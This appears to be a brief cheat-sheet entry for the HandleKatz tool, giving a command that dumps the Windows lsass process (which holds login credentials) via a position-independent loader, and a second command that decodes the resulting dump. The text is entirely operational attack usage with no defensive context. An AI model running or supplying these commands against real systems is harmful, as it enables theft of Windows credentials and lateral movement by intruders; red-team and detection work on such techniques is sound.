### source
https://github.com/codewhitesec/HandleKatz  

### dump lsass process using ReactOS MiniDumpWriteDumpA as Position Independent Code
```
loader.exe --pid:<pid> --outfile:<outfile>.dmp
```

### decode resulting dump
```
python3 Decoder.py -input <lsassDump>.dmp -output <outfile>.dmp
```

